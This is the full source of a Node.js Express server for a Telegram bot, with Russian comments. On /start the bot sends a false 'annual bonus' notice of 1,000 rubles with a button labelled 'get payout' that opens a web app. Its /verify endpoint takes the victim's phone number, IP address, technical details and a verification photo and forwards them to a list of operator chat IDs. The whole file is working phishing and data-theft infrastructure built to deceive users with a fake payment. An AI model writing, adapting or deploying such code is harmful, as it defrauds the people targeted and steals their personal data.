const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');

const app = express();
const upload = multer();

app.use(express.json());
app.use(express.static('public'));

// --- НАСТРОЙКИ ---
const BOT_TOKEN = process.env.BOT_TOKEN;

// Получаем список админов. В Render в переменной CHAT_ID пиши: 123456,789012
const ADMIN_IDS = (process.env.CHAT_ID || '')
    .split(',')
    .map(id => id.trim())
    .filter(id => id); // Убирает пустые значения

// --- 1. ПРИВЕТСТВИЕ (ЛОКАЛЬНОЕ ФОТО) ---
async function sendWelcome(userChatId, req) {
    const photoPath = path.join(__dirname, 'yap.png');
    const webAppUrl = `https://${req.get('host')}`; 

    const captionText = 
        `💳 **Уведомление о начислении #Y-2026**\n\n` +
        `Здравствуйте! Вам доступен ежегодный бонус в рамках программы лояльности.\n\n` +
        `💰 **Сумма: 1,000.00 ₽**\n` +
        `💎 **Статус: Выплата разрешена**\n\n` +
        `Нажмите на кнопку ниже, чтобы зачислить средства через СБП.`;

    try {
        const form = new FormData();
        form.append('chat_id', userChatId);
        form.append('photo', fs.createReadStream(photoPath));
        form.append('caption', captionText);
        form.append('parse_mode', 'Markdown');
        form.append('reply_markup', JSON.stringify({
            inline_keyboard: [[
                { text: "🔘 ПОЛУЧИТЬ ВЫПЛАТУ", web_app: { url: webAppUrl } }
            ]]
        }));

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        console.error("Ошибка приветствия:", e.message);
    }
}

// --- 2. ОБРАБОТЧИК /start ---
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    const { message } = req.body;
    if (message && message.text === '/start') {
        await sendWelcome(message.from.id, req);
    }
    res.sendStatus(200);
});

// --- 3. ГЛАВНАЯ СТРАНИЦА ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- 4. ПРИЕМ ЗАЯВОК (РАССЫЛКА ВСЕМ АДМИНАМ) ---
app.post('/verify', upload.single('photo'), async (req, res) => {
    try {
        const { phone, ip, details } = req.body;
        const photo = req.file;

        const caption = `
💰 **НОВАЯ ЗАЯВКА!**
📞 **Данные:** ${phone}
🌐 **IP:** ${ip}

ℹ️ **ТЕХ. ИНФО:**
${details || 'Нет данных'}
        `;

        // Проходим циклом по всем админам
        for (const adminId of ADMIN_IDS) {
            try {
                if (photo) {
                    // Создаем новую форму для каждого админа (обязательно!)
                    const form = new FormData();
                    form.append('chat_id', adminId);
                    form.append('caption', caption);
                    form.append('parse_mode', 'Markdown');
                    form.append('photo', photo.buffer, { filename: 'verification.jpg' });

                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                        headers: form.getHeaders()
                    });
                } else {
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: adminId,
                        text: caption,
                        parse_mode: 'Markdown'
                    });
                }
                console.log(`Заявка отправлена админу: ${adminId}`);
            } catch (innerError) {
                console.error(`Не удалось отправить админу ${adminId}:`, innerError.message);
                // Не прерываем цикл, пробуем отправить следующему
            }
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('Общая ошибка /verify:', error.message);
        res.sendStatus(500);
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен. Порт: ${PORT}. Админов: ${ADMIN_IDS.length}`));